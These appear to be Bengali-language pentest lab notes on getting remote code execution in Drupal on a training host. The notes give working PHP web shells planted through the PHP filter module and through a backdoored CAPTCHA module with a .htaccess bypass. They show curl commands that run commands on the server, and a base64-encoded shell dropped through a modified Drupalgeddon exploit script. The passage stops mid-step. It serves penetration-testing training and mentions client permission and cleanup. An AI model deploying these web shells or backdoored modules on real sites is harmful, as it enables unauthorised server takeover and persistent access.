## 1. PHP Filter Module দিয়ে RCE

Drupal-এর version 8-এর আগের সংস্করণে admin হিসেবে `PHP filter` module enable করা যেত। এটি embedded PHP code execute করতে দেয়।

Module page: `http://drupal-qa.inlanefreight.local/#overlay=admin/modules`


[stackoverflow.com](https://stackoverflow.com/questions/51485526/how-to-disable-modules-using-the-admin-ui?utm_source=chatgpt.com)

ধাপ:

1. `PHP filter` checkbox select করে Save configuration করো।
2. Content → Add content → Basic page-এ যাও।

`http://drupal-qa.inlanefreight.local/#overlay=node/add`

[drupal.org](https://www.drupal.org/es/docs/user_guide/es/content-create.html?utm_source=chatgpt.com)

3\. Page-এ নিচের PHP code যোগ করো:

```
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

`MD5` hash-এর মতো unpredictable parameter ব্যবহার করলে সাধারণ `cmd` parameter-এর তুলনায় web shell সহজে অনুমান করা কঠিন হয়। Hash-টি এমন command বা string থেকে হতে পারে, যা সহজে guess করা যায় না এবং dictionary wordlist-এ নেই।

Page URL: `http://drupal-qa.inlanefreight.local/#overlay=node/add/page`

4\. Text format থেকে `PHP code` select করে save করো। উদাহরণস্বরূপ, page URL হবে `http://drupal-qa.inlanefreight.local/node/3`।

Browser বা `cURL` দিয়ে command execute করা যায়:

```
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```

Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Drupal 8 ও পরবর্তী সংস্করণ

Drupal 8 থেকে `PHP Filter` defaultভাবে installed থাকে না। এটি install করতে হবে।

[PHP Filter module](https://www.drupal.org/project/php/releases/8.x-1.1?utm_source=chatgpt.com)

```
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

তারপর Administration → Reports → Available updates-এ যাও। Drupal version অনুযায়ী location আলাদা হতে পারে বা Extend menu-তে থাকতে পারে।

`http://drupal.inlanefreight.local/admin/reports/updates/install`

[drupal.org](https://www.drupal.org/project/drupal/issues/2042447?utm_source=chatgpt.com)

Browse করে downloaded archive select করো, তারপর Install চাপো। Module install হলে Content থেকে Basic page তৈরি করে `PHP code` text format select করো।

মনে রাখবে: Client-এর permission নিয়ে এসব পরিবর্তন করতে হবে। কাজ শেষে `PHP Filter` module remove/disable এবং RCE-এর জন্য তৈরি page delete করতে হবে।

## 2. Backdoored Module Upload

যথাযথ permission থাকলে Drupal-এ নতুন module upload করা যায়। Existing module-এ shell যোগ করে backdoored module তৈরি করা সম্ভব।

উদাহরণ: [CAPTCHA module](https://www.drupal.org/project/captcha?utm_source=chatgpt.com)

Archive: `https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz`

Download ও extract:

```
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```

`captcha` directory-তে `shell.php` তৈরি করো:

```
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```

Drupal `/modules` directory-তে direct access block করে। তাই `.htaccess` তৈরি করো:

```
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

এই configuration `/modules`-এর file request করার সময় `/` directory-এর জন্য rules apply করবে।

দুটি file `captcha` folder-এ নিয়ে archive তৈরি করো:

```
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```

Output-এর অংশ:

```
captcha/
captcha/.travis.yml
captcha/README.md
captcha/captcha.api.php
captcha/captcha.inc
captcha/captcha.info.yml
captcha/captcha.install

<SNIP>
```

Admin access থাকলে:

1. Manage → Extend-এ যাও।
2. \+ Install new module চাপো।
3. Backdoored CAPTCHA archive select করে Install করো।

Install URL-এর উদাহরণ:

`http://drupal.inlanefreight.local/admin/modules/install`



[drupal.org](https://www.drupal.org/project/drupal/issues/3182663?utm_source=chatgpt.com)

আরেকটি URL: `http://drupal.inlanefreight.local/core/authorize.php`

Module install হলে `/modules/captcha/shell.php`-এ command execute করা যায়:

```
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 3. Known Vulnerabilities — Drupalgeddon

Drupal core-এ কয়েকটি গুরুতর RCE vulnerability রয়েছে, যেগুলো Drupalgeddon নামে পরিচিত। এই material লেখার সময় তিনটি উল্লেখ করা হয়েছে।

- [CVE-2014-3704 — Drupalgeddon](https://www.drupal.org/SA-CORE-2014-005?utm_source=chatgpt.com): Drupal 7.0–7.31 প্রভাবিত; 7.32-এ fix করা হয়। Pre-authenticated SQL injection দিয়ে malicious form upload বা নতুন admin user তৈরি করা যায়।
- [CVE-2018-7600 — Drupalgeddon2](https://www.drupal.org/sa-core-2018-002?utm_source=chatgpt.com): Drupal 7.58-এর আগের এবং 8.5.1-এর আগের version প্রভাবিত। User registration-এ input sanitization দুর্বল হওয়ায় system command inject করে RCE সম্ভব।
- [CVE-2018-7602 — Drupalgeddon3](https://cvedetails.com/cve/CVE-2018-7602/?utm_source=chatgpt.com): Drupal 7.x ও 8.x-এর একাধিক version প্রভাবিত। Form API-এর improper validation কাজে লাগায়।

### PHP file দিয়ে RCE

Exploit script পরিবর্তন করে malicious PHP file upload করা যায়।

PHP code:

```
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
```

Code-টি Base64 encode করো:

```
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
```

Output:

```
PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
```

Exploit script-এর `echo` command পরিবর্তন করে PHP file লেখার command ব্যবহার করা হয়:

```
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```

তারপর script চালাও:
